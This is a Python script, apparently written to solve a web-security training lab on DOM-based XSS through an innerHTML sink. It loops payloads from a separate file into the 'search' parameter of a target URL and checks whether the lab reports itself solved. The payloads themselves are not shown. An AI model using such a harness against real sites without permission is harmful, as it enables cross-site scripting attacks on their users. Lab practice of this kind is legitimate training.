# Lab: DOM XSS in innerHTML sink using source location.search

import requests
import sys
from bs4 import BeautifulSoup
# For deprecating the warnings
requests.packages.urllib3.disable_warnings()

# Determine proxy details to intercept the request within the burp proxy
# requests.proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

# whether problem has been solved ???
def is_Solved(base_url):
    check_request = requests.get(base_url)
    response = check_request.text
    result = []
    soup = BeautifulSoup(response, features="lxml")
    # whether problem got solved??? need to check about the class: "widgetcontainer-lab-status is-solved"
    result = soup.find("div", {"class" : "widgetcontainer-lab-status is-solved"})

    if result is None:
        return False
    else:
        return True

# validating the payload
def send_exploit(base_url, payload_list):
    print("Payload List: {}\n".format(payload_list))
    # Establishing session for uniformity of requests
    session = requests.session()
    for exploit_payload in payload_list:
        print("Trying the payload: %s" % exploit_payload)
        attack_request = session.get(base_url + "/?search=%s" % exploit_payload)
        # now check whether problem got solved ???
        if is_Solved(base_url) is True:
            print("Solved!!!")
            print("Working payload(exploit) is: %s \n" % exploit_payload)
            break

# main method
if __name__ == "__main__":
    try:
        base_url = sys.argv[1].strip().rstrip('/')        
    except Exception:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    # read payloads from the file
    with open("payload.txt", "r") as f:
        payload_list = f.read().splitlines()
    # check if problem is already solved
    if is_Solved(base_url) is False:
        send_exploit(base_url, payload_list)
    else:
        print('Already Solved!!!\n')
